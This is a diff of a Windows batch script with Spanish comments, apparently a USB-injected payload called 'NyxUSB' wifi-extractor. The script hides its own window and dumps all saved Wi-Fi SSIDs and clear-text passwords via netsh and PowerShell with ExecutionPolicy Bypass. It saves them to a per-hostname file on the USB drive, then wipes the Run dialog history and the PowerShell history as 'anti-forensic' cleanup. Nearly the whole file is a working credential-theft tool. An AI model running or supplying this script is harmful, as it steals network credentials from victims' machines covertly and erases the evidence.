@@ -1,43 +1,50 @@
 @echo off
 
-:: ====================================================
-::               BLOQUE DE CONFIGURACION
-:: ====================================================
-set "NOMBRE_USB=Nyx"
-:: ====================================================
-
-
 :: Ejecutarse en segundo plano si no lo esta
 if "%1" neq "hidden" (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
     exit
 )
 
-:: Buscar la letra de la unidad USB por su etiqueta de volumen
-for /f "delims=" %%D in ('powershell -NoProfile -Command "(Get-Volume | Where-Object {$_.FileSystemLabel -eq '%NOMBRE_USB%'}).DriveLetter"') do (
-    set "DRIVE=%%D"
+:: ====================================================
+::               RESOLUCION DINAMICA DE UNIDAD
+:: ====================================================
+:: Resuelve la ruta directamente desde la ubicacion del script (0 ms, sin PowerShell)
+set "USB_ROOT=%~dp0"
+set "FOLDER_DATA=%USB_ROOT%Data"
+
+:: Si se ejecuta directamente desde la raiz del USB o desde payloads/wifi-extractor/
+if exist "%USB_ROOT%..\..\Data" (
+    set "FOLDER_DATA=%USB_ROOT%..\..\Data"
 )
 
-:: Si no encuentra la USB con ese nombre, aborta el script
-if "%DRIVE%"=="" exit
-
-:: Definir la ruta de destino dentro del almacenamiento de NyxUSB
-set "DESTINO=%DRIVE%:\"
-set "FOLDER_DATA=%DESTINO%Data"
-
-:: Si la carpeta Data no existe, la crea
 if not exist "%FOLDER_DATA%" (
-    mkdir "%FOLDER_DATA%"
+    mkdir "%FOLDER_DATA%" 2>nul
 )
 
-:: Definir la ruta del archivo final de reportes
-set "ARCHIVO_REPORTE=%FOLDER_DATA%\wifi_passwords.txt"
+:: Nombre de reporte con hostname para no sobreescribir extracciones de distintas maquinas
+set "ARCHIVO_REPORTE=%FOLDER_DATA%\wifi_%COMPUTERNAME%.txt"
 
-:: Crear o limpiar el archivo con el encabezado inicial
-echo Redes WiFi detectadas en el sistema operativo: > "%ARCHIVO_REPORTE%"
+:: ====================================================
+::        EXTRACCION AGNOSTICA DEL IDIOMA (XML)
+:: ====================================================
+echo =================================================== > "%ARCHIVO_REPORTE%"
+echo NyxUSB - Reporte WiFi: %COMPUTERNAME% - %DATE% %TIME% >> "%ARCHIVO_REPORTE%"
 echo =================================================== >> "%ARCHIVO_REPORTE%"
 
-:: Bucle en PowerShell puro de una sola linea (evita problemas de escape en Batch)
-powershell -NoProfile -ExecutionPolicy Bypass -Command "netsh wlan show profiles | Select-String ':\s(.*)$' | ForEach-Object { $p = $_.Matches.Groups[1].Value.Trim(); $info = netsh wlan show profile name=$p key=clear; $ssidLine = $info | Select-String 'Nombre de SSID'; $passLine = $info | Select-String 'Contenido de la clave'; if ($ssidLine) { $ssid = $ssidLine.Line.Split(':')[1].Trim().Replace('\"', ''); $pass = if ($passLine) { $passLine.Line.Split(':')[1].Trim() } else { '[Red Abierta o sin clave]' }; Add-Content -Path '%ARCHIVO_REPORTE%' -Value \"`nSSID: $ssid`nPASS: $pass`n----------------------- \" } }"
+:: Exporta perfiles en XML (funciona en cualquier idioma de Windows: ES, EN, FR, etc.)
+netsh wlan export profile folder="%TEMP%" key=clear >nul 2>&1
+
+:: Procesa los XMLs, formatea credenciales y borra los archivos temporales
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$out = '%ARCHIVO_REPORTE%'; Get-ChildItem $env:TEMP -Filter 'Wi-Fi-*.xml' | ForEach-Object { try { [xml]$x = Get-Content $_.FullName; $s = $x.WLANProfile.SSIDConfig.SSID.name; $p = $x.WLANProfile.MSM.security.sharedKey.keyMaterial; if (-not $p) { $p = '[Red Abierta / Sin Clave]' }; Add-Content -Path $out -Value ('SSID: ' + $s + [Environment]::NewLine + 'PASS: ' + $p + [Environment]::NewLine + '-----------------------') } finally { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue } }"
+
+:: ====================================================
+::               LIMPIEZA ANTI-FORENSE (OPSEC)
+:: ====================================================
+:: Borra el comando inyectado del historial de "Ejecutar" (Win + R)
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f >nul 2>&1
+
+:: Limpia el historial de comandos de PowerShell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Get-Command Get-PSReadLineOption -ErrorAction SilentlyContinue) { $h = (Get-PSReadLineOption).HistorySavePath; if (Test-Path $h) { Clear-Content $h -Force -ErrorAction SilentlyContinue } }" >nul 2>&1
 
 exit
